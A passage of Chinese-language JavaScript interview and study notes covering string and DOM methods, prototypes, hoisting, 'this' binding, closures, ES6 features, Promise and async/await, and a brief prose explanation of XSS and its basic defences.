| fixed()             | 以打字机文本显示字符串                                       |
| fontcolor()         | 使用指定的颜色来显示字符串                                   |
| fontsize()          | 使用指定的尺寸来显示字符串                                   |
| fromCharCode()      | 将字符编码转换为一个字符串                                   |
| indexOf()           | 检索字符串，获取给定字符串在字符串对象中首次出现的位置       |
| italics()           | 使用斜体显示字符串                                           |
| lastIndexOf()       | 获取给定字符串在字符串对象中最后出现的位置                   |
| link()              | 将字符串显示为链接                                           |
| localeCompare()     | 返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串 |
| match()             | 根据正则表达式匹配字符串中的字符                             |
| replace()           | 替换与正则表达式匹配的子字符串                               |
| search()            | 获取与正则表达式相匹配字符串首次出现的位置                   |
| slice()             | 截取字符串的片断，并将其返回                                 |
| small()             | 使用小字号来显示字符串                                       |
| split()             | 根据给定字符将字符串分割为字符串数组                         |
| strike()            | 使用删除线来显示字符串                                       |
| sub()               | 把字符串显示为下标                                           |
| substr()            | 从指定索引位置截取指定长度的字符串                           |
| substring()         | 截取字符串中两个指定的索引之间的字符                         |
| sup()               | 把字符串显示为上标                                           |
| toLocaleLowerCase() | 把字符串转换为小写                                           |
| toLocaleUpperCase() | 把字符串转换为大写                                           |
| toLowerCase()       | 把字符串转换为小写                                           |
| toUpperCase()       | 把字符串转换为大写                                           |
| toString()          | 返回字符串                                                   |
| valueOf()           | 返回某个字符串对象的原始值                                   |

#### 去除字符串左右两边的空格

```js
let str = "   123   ";
str=str.trim(); // 123
```



### 8、js 时间与时间戳的转换

#### 时间转时间戳：

javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳

```
var timetamp4 = Number(new Date()) 
```

#### 时间戳转时间

```
function _date(number) {
  let date = new Date(number);
  let y = date.getFullYear();
  let m = date.getMonth()+1;
  let d = date.getDate();
  return (y + "-" + m + "-" + d);  
}
```

###  9、Arguments 对象

**`arguments`** 是一个对应于传递给函数的参数的类数组对象。

```
function func1(a, b, c) {
  console.log(arguments[0]);
  // expected output: 1

  console.log(arguments[1]);
  // expected output: 2

  console.log(arguments[2]);
  // expected output: 3
}

func1(1, 2, 3);
```



### 10、Document 对象

#### Document 对象属性和方法

HTML文档中可以使用以下属性和方法:

| 属性 / 方法                                                  | 描述                                                         |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [document.activeElement](https://www.runoob.com/jsref/prop-document-activeelement.html) | 返回当前获取焦点元素                                         |
| [document.addEventListener()](https://www.runoob.com/jsref/met-document-addeventlistener.html) | 向文档添加句柄                                               |
| [document.adoptNode(node)](https://www.runoob.com/jsref/met-document-adoptnode.html) | 从另外一个文档返回 adapded 节点到当前文档。                  |
| [document.anchors](https://www.runoob.com/jsref/coll-doc-anchors.html) | 返回对文档中所有 Anchor 对象的引用。                         |
| document.applets                                             | 返回对文档中所有 Applet 对象的引用。**注意:** HTML5 已不支持 <applet> 元素。 |
| [document.baseURI](https://www.runoob.com/jsref/prop-doc-baseuri.html) | 返回文档的绝对基础 URI                                       |
| [document.body](https://www.runoob.com/jsref/prop-doc-body.html) | 返回文档的body元素                                           |
| [document.close()](https://www.runoob.com/jsref/met-doc-close.html) | 关闭用 document.open() 方法打开的输出流，并显示选定的数据。  |
| [document.cookie](https://www.runoob.com/jsref/prop-doc-cookie.html) | 设置或返回与当前文档有关的所有 cookie。                      |
| [document.createAttribute()](https://www.runoob.com/jsref/met-document-createattribute.html) | 创建一个属性节点                                             |
| [document.createComment()](https://www.runoob.com/jsref/met-document-createcomment.html) | createComment() 方法可创建注释节点。                         |
| [document.createDocumentFragment()](https://www.runoob.com/jsref/met-document-createdocumentfragment.html) | 创建空的 DocumentFragment 对象，并返回此对象。               |
| [document.createElement()](https://www.runoob.com/jsref/met-document-createelement.html) | 创建元素节点。                                               |
| [document.createTextNode()](https://www.runoob.com/jsref/met-document-createtextnode.html) | 创建文本节点。                                               |
| [document.doctype](https://www.runoob.com/jsref/prop-document-doctype.html) | 返回与文档相关的文档类型声明 (DTD)。                         |
| [document.documentElement](https://www.runoob.com/jsref/prop-document-documentelement.html) | 返回文档的根节点                                             |
| [document.documentMode](https://www.runoob.com/jsref/prop-doc-documentmode.html) | 返回用于通过浏览器渲染文档的模式                             |
| [document.documentURI](https://www.runoob.com/jsref/prop-document-documenturi.html) | 设置或返回文档的位置                                         |
| [document.domain](https://www.runoob.com/jsref/prop-doc-domain.html) | 返回当前文档的域名。                                         |
| document.domConfig                                           | **已废弃**。返回 normalizeDocument() 被调用时所使用的配置。  |
| [document.embeds](https://www.runoob.com/jsref/coll-doc-embeds.html) | 返回文档中所有嵌入的内容（embed）集合                        |
| [document.forms](https://www.runoob.com/jsref/coll-doc-forms.html) | 返回对文档中所有 Form 对象引用。                             |
| [document.getElementsByClassName()](https://www.runoob.com/jsref/met-document-getelementsbyclassname.html) | 返回文档中所有指定类名的元素集合，作为 NodeList 对象。       |
| [document.getElementById()](https://www.runoob.com/jsref/met-document-getelementbyid.html) | 返回对拥有指定 id 的第一个对象的引用。                       |
| [document.getElementsByName()](https://www.runoob.com/jsref/met-doc-getelementsbyname.html) | 返回带有指定名称的对象集合。                                 |
| [document.getElementsByTagName()](https://www.runoob.com/jsref/met-document-getelementsbytagname.html) | 返回带有指定标签名的对象集合。                               |
| [document.images](https://www.runoob.com/jsref/coll-doc-images.html) | 返回对文档中所有 Image 对象引用。                            |
| [document.implementation](https://www.runoob.com/jsref/prop-document-implementation.html) | 返回处理该文档的 DOMImplementation 对象。                    |
| [document.importNode()](https://www.runoob.com/jsref/met-document-importnode.html) | 把一个节点从另一个文档复制到该文档以便应用。                 |
| [document.inputEncoding](https://www.runoob.com/jsref/prop-document-inputencoding.html) | 返回用于文档的编码方式（在解析时）。                         |
| [document.lastModified](https://www.runoob.com/jsref/prop-doc-lastmodified.html) | 返回文档被最后修改的日期和时间。                             |
| [document.links](https://www.runoob.com/jsref/coll-doc-links.html) | 返回对文档中所有 Area 和 Link 对象引用。                     |
| [document.normalize()](https://www.runoob.com/jsref/met-document-normalize.html) | 删除空文本节点，并连接相邻节点                               |
| [document.normalizeDocument()](https://www.runoob.com/jsref/met-document-normalizedocument.html) | 删除空文本节点，并连接相邻节点的                             |
| [document.open()](https://www.runoob.com/jsref/met-doc-open.html) | 打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。 |
| [document.querySelector()](https://www.runoob.com/jsref/met-document-queryselector.html) | 返回文档中匹配指定的CSS选择器的第一元素                      |
| [document.querySelectorAll()](https://www.runoob.com/jsref/met-document-queryselectorall.html) | document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表 |
| [document.readyState](https://www.runoob.com/jsref/prop-doc-readystate.html) | 返回文档状态 (载入中……)                                      |
| [document.referrer](https://www.runoob.com/jsref/prop-doc-referrer.html) | 返回载入当前文档的文档的 URL。                               |
| [document.removeEventListener()](https://www.runoob.com/jsref/met-document-removeeventlistener.html) | 移除文档中的事件句柄(由 addEventListener() 方法添加)         |
| [document.renameNode()](https://www.runoob.com/jsref/met-document-renamenode.html) | 重命名元素或者属性节点。                                     |
| [document.scripts](https://www.runoob.com/jsref/coll-doc-scripts.html) | 返回页面中所有脚本的集合。                                   |
| [document.strictErrorChecking](https://www.runoob.com/jsref/prop-document-stricterrorchecking.html) | 设置或返回是否强制进行错误检查。                             |
| [document.title](https://www.runoob.com/jsref/prop-doc-title.html) | 返回当前文档的标题。                                         |
| [document.URL](https://www.runoob.com/jsref/prop-doc-url.html) | 返回文档完整的URL                                            |
| [document.write()](https://www.runoob.com/jsref/met-doc-write.html) | 向文档写 HTML 表达式 或 JavaScript 代码。                    |
| [document.writeln()](https://www.runoob.com/jsref/met-doc-writeln.html) | 等同于 write() 方法，不同的是在每个表达式之后写一个换行符。  |



### 11、JS中阻止冒泡事件

冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。

```html
<div class="box">
	<button class="btn">按钮</button>
</div>

<script type="text/javascript">
	$('.btn').click(function () {
		alert('按钮被点击了')
	});
	$('.box').click(function () {
		alert('box被点击了')
	})
</script>
```

当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件



```js
	$('.btn').click(function (even) {
		even.stopPropagation();
		alert('按钮被点击了');
	})

```

### 12、阻止默认事件

```
<a href="javascript:;">链接</a>

<a href="javascript:void(0);">链接</a>

```



```
<a href="" id="link">链接</a>

<script>
        document.getElementById("link").onclick = function (){
            console.log("666");
            return false;
        }
</script>

```



```
<a href="" id="link">链接</a>

<script>
    document.getElementById("link").onclick = function (e){
        console.log("666");
        e.preventDefault();
    }
</script>

```



### 13、window.location

#### Location 对象属性

| 属性                                                         | 描述                                          |
| :----------------------------------------------------------- | :-------------------------------------------- |
| [hash](https://www.w3school.com.cn/jsref/prop_loc_hash.asp)  | 设置或返回从井号 (#) 开始的 URL（锚）。       |
| [host](https://www.w3school.com.cn/jsref/prop_loc_host.asp)  | 设置或返回主机名和当前 URL 的端口号。         |
| [hostname](https://www.w3school.com.cn/jsref/prop_loc_hostname.asp) | 设置或返回当前 URL 的主机名。                 |
| [href](https://www.w3school.com.cn/jsref/prop_loc_href.asp)  | 设置或返回完整的 URL。                        |
| [pathname](https://www.w3school.com.cn/jsref/prop_loc_pathname.asp) | 设置或返回当前 URL 的路径部分。               |
| [port](https://www.w3school.com.cn/jsref/prop_loc_port.asp)  | 设置或返回当前 URL 的端口号。                 |
| [protocol](https://www.w3school.com.cn/jsref/prop_loc_protocol.asp) | 设置或返回当前 URL 的协议。                   |
| [search](https://www.w3school.com.cn/jsref/prop_loc_search.asp) | 设置或返回从问号 (?) 开始的 URL（查询部分）。 |

#### Location 对象方法

| 属性                                                         | 描述                     |
| :----------------------------------------------------------- | :----------------------- |
| [assign()](https://www.w3school.com.cn/jsref/met_loc_assign.asp) | 加载新的文档。           |
| [reload()](https://www.w3school.com.cn/jsref/met_loc_reload.asp) | 重新加载当前文档。       |
| [replace()](https://www.w3school.com.cn/jsref/met_loc_replace.asp) | 用新的文档替换当前文档。 |





### 14、原型与原型链

#### 原型 prototype

原型是函数特有

```js
   <script>
        function fu(){

        }
        fu.prototype.name = 'kif'
        console.log(fu.prototype.name)
    </script>
```

挂载在原型上是为了继承(通过new)



![image-20220313141218874](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846409.png)



![image-20220313143722625](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846610.png)

继承后查找时就近，

判断属性时继承的还是后天添加的：hasOwnProperty



![image-20220313144106245](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846172.png)

可以拿到p1的私有属性

这个方法既不是Persion也不是p1的，而是Persion继承自Object的

![image-20220313144302492](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846687.png)

![image-20220313144416164](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846218.png)

#### 原型链：\_proto_

对象，数组，函数等有原型链

![image-20220313140745799](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847761.png)





### 预编译

```js
function fn(a,c){
	console.log(a)
	var a =123;
	console.log(a)
	console.log(c)
	function a(){}
	if(false){
		var  d =678
	}
	console.log(d)
	console.log(b)
	var b =function(){}
	console.log(b)
	function c(){}
	console.log(c)
}
fn(2,3)


```

 预编译步骤：

1. 创建AO对象

   ```
   AO：{
   
   }
   ```

   

2. 找形参和变量声明

   ```
   AO：{
   	a:undefind
   	c:undefind
   	d:undefind
   	bLundefind
   }
   ```

   

3. 实参与形参相统一

   ```
   AO：{
   	a:2
   	c:3
   	d:undefind
   	b:undefind
   }
   ```

   

4. 找函数申明（会覆盖变量）

   

   ```
   AO：{
   	a:function a(){}
   	c:function c(){}
   	d:undefind
   	b:undefind
   }
   ```

   注:var b =function(){}不是函数声明

5. 逐行执行

   ```
   function fn(a,c){
   	console.log(a)//function a(){}
   	var a =123;
   	console.log(a)//123
   	console.log(c)//function c(){}
   	function a(){}
   	if(false){
   		var  d =678
   	}
   	console.log(d)//undefind
   	console.log(b)//undefind
   	var b =function(){}
   	console.log(b)//function(){}
   	function c(){}
   	console.log(c)//function c(){}
   }
   fn(2,3)
   
   
   ```

   ![image-20220313175244724](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847985.png)

### 15、this

#### 函数直接调用

```
function get(a){
    console.log(a)
}
get('kif')

```

其中 **get('kif')** 其实是**get.call(window,'kif' )**

![image-20220313181429301](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847478.png)

即：对象.方法.call(对象，参数)

#### 对象方法

```js
var Persion = {
    name: 'kif',
    getName: function (time) {
        console.log(this.name,time)
    }
}
Persion.getName(299)

```

同理：

Persion.getName(299)为：Persion.getName.call(Persion,299)

![image-20220313181905131](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847377.png)



#### 案例：

```js
var name = 222
var a={
    name :111,
    say:function(){
        console.log(this.name)
    }
}
var fun = a.say
fun()//fun.call(window,)======>222
a.say()//a.say.call(a,)=======>111
var b ={
    name:333,
    say:function(fun){
        fun()//fun.call(window,)//222
    }
}
b.say(a.say)//
b.say=a.say
b.say()//b.say.call(b,)=======>333
```

#### 箭头函数中this

```js
var x =11
var p ={
    x:22,
    say:()=>{
        console.log(this.x)
    }
}
p.say()
```

箭头函数中this固定指向代码块外部

![image-20220313185716281](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847387.png)





#### this指向（普通函数、箭头函数）

**参考答案：**

普通函数中的this

1. 谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁

```js
        let getThis = function () {
            console.log(this);
        }

        let obj={
            name:"Jack",
            getThis:function(){
                console.log(this);
            }
        }
        //getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window
        getThis();//window
        //此处的getThis()方法是obj这个对象调用的，所以this指向obj
        obj.getThis();//obj
```

1. 匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象；

```js
        let obj = {
            getThis: function () {
                return function () {
                    console.log(this);
                }
            }
        }
        obj.getThis()(); //window
```

上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)：

```js
       let obj = {
            getThis: function () {
            //提前保存this指向
                let _this=this
                return function () {
                    console.log(_this);
                }
            }
        }
        obj.getThis()(); //obj
```

1. 箭头函数中的this
   1. 箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的；
   2. 箭头函数中的this指向父级作用域的执行上下文；（技巧：**因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this**）
   3. 箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。

例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。

```js
        let obj = {
            //此处的this即是箭头函数中的this
            getThis: function () {
                return  ()=> {
                    console.log(this);
                }
            }
        }
        obj.getThis()(); //obj
```

例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。

[复制代码](https://www.nowcoder.com/study/live/691/2/9#)

```js
        //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。
       let obj = {
            getThis: ()=> {
                return  ()=> {
                    console.log(this);
                }
            }
        }
        obj.getThis()(); //window
```





### 16、闭包

####  形式：

方法里面返回一个方法

```js
function a() {
        let a = 1;
        return function () {
          return a;
        };
      }
```



#### 意义：

1. 延长变量生命周期
2. 创建私有环境

 

Vue中data也是一个闭包

```
data（）{
	return{
	
	}
}
```

会常驻内存，所以慎用



### 17、ES6

#### var let const



##### var:

1. 变量提升

   ```js
   console.log(a)//undefined
   var a = 12
   ```

   

2. 变量覆盖

   ```js
   var a =12
   var a =23
   console.log(a)//23
   ```

   

3. 没有块级作用域

   ```js
   function fu(){
   	for(var i=0;i<3;i++){
   		console.log(i)
   	}
   	console.log(i)//3
   }
   ```

   

##### const:

1. const声明之后必须赋值

2. const定义数组，可以对数组修改

   ```js
   const arr = ["sad", "666", "qewqe"];
   arr.push('5465')
   console.log(arr)
   ```

   

#### 解构

```
let a=1;
let b =2;

```

不使用第三个变量互换值

```
[a,b]=[b,a]
```

#### 去重



```js
let arr=[1,2,3,4,5,2,3,4,2]
let ans = [...new Set(arr)]
console.log(ans)
```

#### promise

```js
let p = new Promise((resolve, reject) => {
    console.log(1)
    resolve()
    console.log(2)
})
p.then(() => {
    console.log(3)
})
console.log(4)
```

- 构造函数同步执行   //1,2
- 异步函数异步执行 //4,3



### 18、xss

xss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；
首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “<> , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；
攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ；

### 19、SEO

SEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。



### 20、数组去重



ES6：

```js
let  arr = [12, 12, 3, 2, 23, 23, 4, 3, 2];

function unique(arr) {
  return Array.from(new Set(arr));
}
console.log(unique(arr));

```

```js
let arr = [12, 12, 34, 21, 34, 21, 5, 2, 5];
function unique(arr) {
  return [...new Set(arr)];
}
console.log(unique(arr));

```



ES5：

```js
let arr = [12, 12, 3, 4, 4, 3, 5, 23, 12, 3];
function unique(arr) {
  let Newarr = [];
  for (let i = 0; i < arr.length; i++) {
    if (Newarr.indexOf(arr[i]) == -1) {
      Newarr.push(arr[i]);
    }
  }
  return Newarr;
}
console.log(unique(arr));

```



### 21、数组和伪数组的区别



1. 定义

- 数组是一个特殊对象,与常规对象的区别：
  - 当由新元素添加到列表中时，自动更新length属性
  - 设置length属性，可以截断数组
  - 从Array.protoype中继承了方法
  - 属性为'Array'
- 类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。

1. 区别
   本质：类数组是简单对象，它的原型关系与数组不同。

```js
// 原型关系和原始值转换
let arrayLike = {
    length: 10,
};
console.log(arrayLike instanceof Array); // false
console.log(arrayLike.__proto__.constructor === Array); // false
console.log(arrayLike.toString()); // [object Object]
console.log(arrayLike.valueOf()); // {length: 10}

let array = [];
console.log(array instanceof Array); // true
console.log(array.__proto__.constructor === Array); // true
console.log(array.toString()); // ''
console.log(array.valueOf()); // []
```

1. 类数组转换为数组

- 转换方法
  - 使用 `Array.from()`
  - 使用 `Array.prototype.slice.call()`
  - 使用 `Array.prototype.forEach()` 进行属性遍历并组成新的数组
- 转换须知
  - 转换后的数组长度由 `length` 属性决定。索引不连续时转换结果是连续的，会自动补位。
  - 代码示例

```js
let al1 = {
    length: 4,
    0: 0,
    1: 1,
    3: 3,
    4: 4,
    5: 5,
};
console.log(Array.from(al1)) // [0, 1, undefined, 3]
```

- ②仅考虑 0或正整数 的索引

```js
// 代码示例
let al2 = {
    length: 4,
    '-1': -1,
    '0': 0,
    a: 'a',
    1: 1
};
console.log(Array.from(al2)); // [0, 1, undefined, undefined]
```

- ③使用slice转换产生稀疏数组

```js
// 代码示例
let al2 = {
    length: 4,
    '-1': -1,
    '0': 0,
    a: 'a',
    1: 1
};
console.log(Array.prototype.slice.call(al2)); //[0, 1, empty × 2]
```

1. 使用数组方法操作类数组注意地方

[复制代码](https://www.nowcoder.com/study/live/691/2/4#)

```js
  let arrayLike2 = {
    2: 3,
    3: 4,
    length: 2,
    push: Array.prototype.push
  }

  // push 操作的是索引值为 length 的位置
  arrayLike2.push(1);
  console.log(arrayLike2); // {2: 1, 3: 4, length: 3, push: ƒ}
  arrayLike2.push(2);
  console.log(arrayLike2); // {2: 1, 3: 2, length: 4, push: ƒ}
```





### 22、手写一个发布订阅

```js
// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储;
interface CacheProps {
  [key: string]: Array<((data?: unknown) => void)>;
}

class Observer {
  private caches: CacheProps = {}; // 事件中心
  on (eventName: string, fn: (data?: unknown) => void){ // eventName事件名-独一无二, fn订阅后执行的自定义行为
    this.caches[eventName] = this.caches[eventName] || [];
    this.caches[eventName].push(fn);
  }

  emit (eventName: string, data?: unknown) { // 发布 => 将订阅的事件进行统一执行
    if (this.caches[eventName]) {
      this.caches[eventName].forEach((fn: (data?: unknown) => void) => fn(data));
    }
  }

  off (eventName: string, fn?: (data?: unknown) => void) { // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息
    if (this.caches[eventName]) {
      const newCaches = fn ? this.caches[eventName].filter(e => e !== fn) : [];
      this.caches[eventName] = newCaches;
    }
  }

}
```







### 23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？

**参考答案**：

**Set**

1. 成员不能重复；
2. 只有键值，没有键名，有点类似数组；
3. 可以遍历，方法有 `add、delete、has`

**WeakSet**

1. 成员都是对象（引用）；
2. 成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；
3. 不能遍历，方法有 `add、delete、has`；

**Map**

1. 本质上是键值对的集合，类似集合；
2. 可以遍历，方法很多，可以跟各种数据格式转换；

**WeakMap**

1. 只接收对象为键名（null 除外），不接受其他类型的值作为键名；
2. 键名指向的对象，不计入垃圾回收机制；
3. 不能遍历，方法同 `get、set、has、delete`；



### 24、简单说说 js 中有哪几种内存泄露的情况



1. 意外的全局变量；
2. 闭包；
3. 未被清空的定时器；
4. 未被销毁的事件监听；
5. DOM 引用；



### 25、json和xml数据的区别

**参考答案**：

1. 数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。
2. 数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。
3. 数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互
4. 数据描述方面：json对数据的描述性比xml较差
5. xml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。



### 26、JavaScript有几种方法判断变量的类型?

**参考答案**：

1. 使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。
2. 使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。
3. 使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。

### 27、Math

#### Math 对象方法

| 方法                                                         | 描述                                                         |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [abs(x)](https://www.runoob.com/jsref/jsref-abs.html)        | 返回 x 的绝对值。                                            |
| [acos(x)](https://www.runoob.com/jsref/jsref-acos.html)      | 返回 x 的反余弦值。                                          |
| [asin(x)](https://www.runoob.com/jsref/jsref-asin.html)      | 返回 x 的反正弦值。                                          |
| [atan(x)](https://www.runoob.com/jsref/jsref-atan.html)      | 以介于 -PI/2 与 PI/2 弧度之间的数值来返回 x 的反正切值。     |
| [atan2(y,x)](https://www.runoob.com/jsref/jsref-atan2.html)  | 返回从 x 轴到点 (x,y) 的角度（介于 -PI/2 与 PI/2 弧度之间）。 |
| [ceil(x)](https://www.runoob.com/jsref/jsref-ceil.html)      | 对数进行上舍入。                                             |
| [cos(x)](https://www.runoob.com/jsref/jsref-cos.html)        | 返回数的余弦。                                               |
| [exp(x)](https://www.runoob.com/jsref/jsref-exp.html)        | 返回 Ex 的指数。                                             |
| [floor(x)](https://www.runoob.com/jsref/jsref-floor.html)    | 对 x 进行下舍入。                                            |
| [log(x)](https://www.runoob.com/jsref/jsref-log.html)        | 返回数的自然对数（底为e）。                                  |
| [max(x,y,z,...,n)](https://www.runoob.com/jsref/jsref-max.html) | 返回 x,y,z,...,n 中的最高值。                                |
| [min(x,y,z,...,n)](https://www.runoob.com/jsref/jsref-min.html) | 返回 x,y,z,...,n中的最低值。                                 |
| [pow(x,y)](https://www.runoob.com/jsref/jsref-pow.html)      | 返回 x 的 y 次幂。                                           |
| [random()](https://www.runoob.com/jsref/jsref-random.html)   | 返回 0 ~ 1 之间的随机数。                                    |
| [round(x)](https://www.runoob.com/jsref/jsref-round.html)    | 四舍五入。                                                   |
| [sin(x)](https://www.runoob.com/jsref/jsref-sin.html)        | 返回数的正弦。                                               |
| [sqrt(x)](https://www.runoob.com/jsref/jsref-sqrt.html)      | 返回数的平方根。                                             |
| [tan(x)](https://www.runoob.com/jsref/jsref-tan.html)        | 返回角的正切。                                               |



```js
Math.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)
```



题目：

```js
var min = Math.min();
var max = Math.max();
console.log(min < max);
// 写出执行结果，并解释原因
```

**答案**
false

**解析**

- 按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false
- MDN 相关文档是这样解释的
  - Math.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。
  - 而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false

###  28、promise和 async await 区别

**参考答案：**

- **概念**
  **Promise** 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的

  **async await**也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。

- ##### 两者的区别

  1. Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。
  2. async await与Promise一样，是非阻塞的。
  3. async await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。

### 29、 defer和async区别

**参考答案：**

区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个

**解析：**

在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后

```html
<script src="script.js"></script>
```

async：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。
但是多个js文件的加载顺序不会按照书写顺序进行

```html
<script async src="script.js"></script>
```

derer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。

```html
<script defer src="script.js"></script>
```



### 30、同步和异步

**参考答案：**

同步

- 指在 **主线程**上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。
- 也就是调用一旦开始，必须这个调用 **返回结果**(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。

异步

- 异步任务是指不进入主线程，而进入 **任务队列**的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。
- 每一个任务有一个或多个 **回调函数**。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。
- 程序的执行顺序和任务的排列顺序是**不一致**的，异步的。
- 我们常用的setTimeout和setInterval函数，Ajax都是异步操作。



### 31、 实现异步的方法

**参考答案：**

回调函数（Callback）、事件监听、发布订阅、Promise/A+、生成器Generators/ yield、async/await

1. JS 异步编程进化史：callback -> promise -> generator -> async + await

2. async/await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。

3. async/await可以说是异步终极解决方案了。

   (1) async/await函数相对于Promise，优势体现在：

   - 处理 then 的调用链，能够更清晰准确的写出代码
   - 并且也能优雅地解决回调地狱问题。

   当然async/await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。

   (2) async/await函数对 Generator 函数的改进，体现在以下三点：

   - 内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，**async 函数的执行，与普通函数一模一样，只要一行**。
   - 更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 **async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）**。
   - 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。



1. async/await

   Async/Await简介

    使用async/await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：

    1. async/await是基于Promise实现的，它不能用于普通的回调函数。

    2. async/await与Promise一样，是非阻塞的。

   ```
